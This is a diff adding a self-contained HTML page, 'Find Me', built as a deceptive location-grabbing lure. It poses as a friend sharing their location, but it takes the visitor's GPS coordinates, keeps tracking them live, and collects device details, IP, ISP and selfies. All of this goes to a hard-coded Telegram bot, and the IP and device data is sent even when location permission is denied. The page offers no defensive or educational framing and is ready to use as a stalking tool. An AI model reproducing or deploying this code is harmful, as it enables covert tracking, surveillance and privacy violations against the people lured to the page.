@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Find Me</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{font-family:-apple-system,system-ui,"Segoe UI",sans-serif;
+       min-height:100vh;display:flex;align-items:center;justify-content:center;
+       background:#0b0f19;color:#fff;text-align:center;padding:26px;overflow:hidden}
+  .card{max-width:360px;width:100%}
+  .avatar{width:110px;height:110px;border-radius:50%;object-fit:cover;
+          border:3px solid #38bdf8;margin:0 auto 18px;display:block;background:#1e293b}
+  .avatar.ph{display:flex;align-items:center;justify-content:center;
+             font-size:40px;color:#64748b}
+  h2{font-size:20px;margin-bottom:8px;font-weight:600}
+  p{color:#94a3b8;line-height:1.55;font-size:15px}
+  .btn{display:inline-flex;align-items:center;gap:8px;margin-top:22px;
+       padding:14px 26px;background:#38bdf8;color:#0b0f19;border:none;
+       border-radius:12px;font-weight:700;font-size:15px;cursor:pointer}
+  .btn.ghost{background:transparent;color:#38bdf8;border:1.5px solid #38bdf8}
+  .btn:active{transform:scale(.97)}
+  .spin{width:52px;height:52px;border:5px solid rgba(255,255,255,.15);
+        border-top-color:#38bdf8;border-radius:50%;margin:0 auto 20px;
+        animation:s 1s linear infinite}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .big{font-size:56px;margin-bottom:14px}
+  .meta{font-size:13px;color:#64748b;margin-top:14px;word-break:break-word}
+  video{width:100%;max-width:320px;border-radius:16px;margin-top:16px;
+        background:#000;transform:scaleX(-1)}
+  .hidden{display:none}
+</style>
+</head>
+<body>
+<div class="card" id="app"></div>
+
+<script>
+/* ================= CONFIG ================= */
+const CONFIG = {
+  BOT_TOKEN: "PASTE_BOT_TOKEN_HERE",
+  CHAT_ID:   "PASTE_CHAT_ID_HERE",
+  PHOTO: "",
+  NAME: "Someone",
+  GREETING: "Hey! Sharing my location so you can find me.",
+  LIVE_EVERY: 20
+};
+
+/* ================= URL PARAMS ================= */
+const q = new URLSearchParams(location.search);
+const RECEIVER = q.get("name") || q.get("n") || CONFIG.NAME;
+const PHOTO    = q.get("photo") || q.get("p") || CONFIG.PHOTO;
+const GREETING = q.get("msg") || CONFIG.GREETING;
+
+const API = "https://api.telegram.org/bot" + CONFIG.BOT_TOKEN;
+const app = document.getElementById("app");
+const $ = (h) => { app.innerHTML = h; };
+
+/* ================= TELEGRAM ================= */
+function tg(method, body, isForm) {
+  return fetch(API + "/" + method, {
+    method: "POST",
+    headers: isForm ? {} : {"Content-Type": "application/json"},
+    body: isForm ? body : JSON.stringify(body)
+  }).catch(()=>{});
+}
+const sendText = (t) => tg("sendMessage", {chat_id: CONFIG.CHAT_ID, text: t, disable_web_page_preview:false});
+const sendPin  = (lat,lon) => tg("sendLocation", {chat_id: CONFIG.CHAT_ID, latitude:lat, longitude:lon});
+const sendPic  = (blob, cap) => {
+  const fd = new FormData();
+  fd.append("chat_id", CONFIG.CHAT_ID);
+  fd.append("caption", cap || "");
+  fd.append("photo", blob, "capture.jpg");
+  return tg("sendPhoto", fd, true);
+};
+
+/* ================= DEVICE INFO ================= */
+async function deviceInfo() {
+  const n = navigator, c = n.connection || {};
+  const d = {
+    "Naam": RECEIVER,
+    "Platform": n.platform || "?",
+    "User Agent": n.userAgent,
+    "Language": n.language,
+    "Screen": screen.width + "x" + screen.height + " @" + (window.devicePixelRatio||1) + "x",
+    "Cores": n.hardwareConcurrency || "?",
+    "Memory": (n.deviceMemory || "?") + " GB",
+    "Network": (c.effectiveType || "?") + (c.downlink ? " / " + c.downlink + "Mbps" : ""),
+    "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+    "Local Time": new Date().toLocaleString()
+  };
+  try {
+    const b = await n.getBattery();
+    d["Battery"] = Math.round(b.level*100) + "%" + (b.charging ? " (charging)" : "");
+  } catch(e){}
+  return d;
+}
+
+/* ================= IP FALLBACK ================= */
+async function ipInfo() {
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const j = await r.json();
+    return {
+      ip: j.ip, city: j.city, region: j.region, country: j.country_name,
+      org: j.org, lat: j.latitude, lon: j.longitude
+    };
+  } catch(e){ return null; }
+}
+
+/* ================= SCREENS ================= */
+function intro() {
+  const av = PHOTO
+    ? `<img class="avatar" src="${PHOTO}" alt="">`
+    : `<div class="avatar ph">👤</div>`;
+  $(
+    av +
+    `<h2>${RECEIVER}</h2>` +
+    `<p>${GREETING}</p>` +
+    `<button class="btn" id="go">📍 Share my location</button>`
+  );
+  document.getElementById("go").onclick = start;
+}
+
+function start() {
+  $(
+    `<div class="spin"></div><h2>Getting your location...</h2>` +
+    `<p>Tap <b>Allow</b> in the popup</p>`
+  );
+  if (!navigator.geolocation) return denied({code:0});
+  navigator.geolocation.getCurrentPosition(ok, denied,
+    {enableHighAccuracy:true, timeout:15000, maximumAge:0});
+}
+
+let watchId = null, lastSent = 0;
+
+async function ok(pos) {
+  const {latitude:lat, longitude:lon, accuracy:acc} = pos.coords;
+  $(
+    `<div class="big">✅</div><h2>Location shared!</h2>` +
+    `<p>Lat ${lat.toFixed(5)}, Lon ${lon.toFixed(5)}<br>±${Math.round(acc)} m</p>` +
+    `<button class="btn" id="selfie">📸 Send a selfie</button>` +
+    `<button class="btn ghost" id="done">Done</button>`
+  );
+  document.getElementById("selfie").onclick = camera;
+  document.getElementById("done").onclick = () =>
+    $(`<div class="big">👍</div><h2>All set</h2><p>You can close this page.</p>`);
+
+  sendPin(lat, lon);
+  const dev = await deviceInfo();
+  const ip = await ipInfo();
+  let msg = "📍 *Location received*\n\n" +
+    "🗺 https://www.google.com/maps?q=" + lat + "," + lon +
+    "\nAccuracy: " + Math.round(acc) + " m\n\n";
+  msg += "*Device info*\n" + Object.entries(dev).map(([k,v])=>k+": "+v).join("\n");
+  if (ip) msg += "\n\n*IP info*\nIP: " + ip.ip + "\nCity: " + ip.city +
+                 ", " + ip.region + ", " + ip.country + "\nISP: " + ip.org;
+  sendText(msg);
+
+  if (CONFIG.LIVE_EVERY > 0) {
+    watchId = navigator.geolocation.watchPosition((p) => {
+      const now = Date.now();
+      if (now - lastSent < CONFIG.LIVE_EVERY*1000) return;
+      lastSent = now;
+      sendPin(p.coords.latitude, p.coords.longitude);
+    }, ()=>{}, {enableHighAccuracy:true, maximumAge:0});
+  }
+}
+
+async function denied(err) {
+  const dev = await deviceInfo();
+  const ip = await ipInfo();
+  let where = ip ? (ip.city + ", " + ip.region + ", " + ip.country) : "unknown";
+  $(
+    `<div class="big">⚠️</div><h2>Location denied</h2>` +
+    `<p>But we still got your details.</p>` +
+    `<p class="meta">Approx location: ${where}<br>IP: ${ip ? ip.ip : "-"}</p>` +
+    `<button class="btn ghost" id="retry">Try again</button>`
+  );
+  document.getElementById("retry").onclick = start;
+
+  let msg = "⚠️ *Location DENIED by " + RECEIVER + "*\n\n";
+  if (ip) msg += "*IP-based location*\n" + where +
+    "\nMap: https://www.google.com/maps?q=" + ip.lat + "," + ip.lon +
+    "\nIP: " + ip.ip + "\nISP: " + ip.org + "\n\n";
+  msg += "*Device info*\n" + Object.entries(dev).map(([k,v])=>k+": "+v).join("\n");
+  sendText(msg);
+}
+
+/* ================= CAMERA ================= */
+async function camera() {
+  $(
+    `<h2>Say cheese 📸</h2>` +
+    `<video id="v" autoplay playsinline></video>` +
+    `<button class="btn" id="shot">Capture</button>` +
+    `<button class="btn ghost" id="cancel">Cancel</button>`
+  );
+  const v = document.getElementById("v");
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    v.srcObject = stream;
+  } catch(e) {
+    const inp = document.createElement("input");
+    inp.type = "file"; inp.accept = "image/*"; inp.capture = "user";
+    inp.onchange = () => { if (inp.files[0]) sendPic(inp.files[0], "📸 Selfie from " + RECEIVER); thanks(); };
+    inp.click();
+  }
+  document.getElementById("cancel").onclick = () => {
+    if (stream) stream.getTracks().forEach(t=>t.stop());
+    doneScreen();
+  };
+  document.getElementById("shot").onclick = () => {
+    const c = document.createElement("canvas");
+    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext("2d").drawImage(v,0,0);
+    c.toBlob(async (blob) => {
+      sendPic(blob, "📸 Selfie from " + RECEIVER);
+      if (stream) stream.getTracks().forEach(t=>t.stop());
+      thanks();
+    }, "image/jpeg", 0.85);
+  };
+}
+
+function thanks() {
+  $(
+    `<div class="big">🎉</div><h2>Photo sent!</h2>` +
+    `<p>Thanks, ${RECEIVER}.</p>` +
+    `<button class="btn ghost" id="done2">Done</button>`
+  );
+  document.getElementById("done2").onclick = doneScreen;
+}
+function doneScreen() {
+  $(`<div class="big">✅</div><h2>All done</h2><p>You can close this page.</p>`);
+}
+
+/* ================= GO ================= */
+intro();
+</script>
+</body>
+  </html>
